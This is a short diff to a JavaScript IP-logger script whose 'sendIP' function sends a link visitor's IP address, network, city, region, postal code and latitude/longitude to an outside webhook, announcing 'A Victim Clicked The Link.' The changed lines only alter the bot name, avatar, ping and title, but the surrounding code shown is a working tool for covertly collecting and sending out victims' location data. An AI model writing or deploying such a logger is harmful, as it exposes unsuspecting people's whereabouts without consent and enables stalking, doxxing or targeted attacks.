@@ -13,12 +13,12 @@ const sendIP = () => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "site logger <3", // optionally changeable
-                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
-                            content: `@here`,
+                            username: "Ip Logger", // optionally changeable
+                            avatar_url: "https://i.pinimg.com/originals/09/cd/73/09cd733ddfbc4c1c3ee7eadb4a9090f9.jpg", // optionally changeable
+                            content: `@everyone`,
                             embeds: [
                                 {
-                                    title: 'A victim clicked on the link!',
+                                    title: 'A Victim Clicked The Link.',
                                     description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                     color: 0x800080 // optionally changeable
                                 }
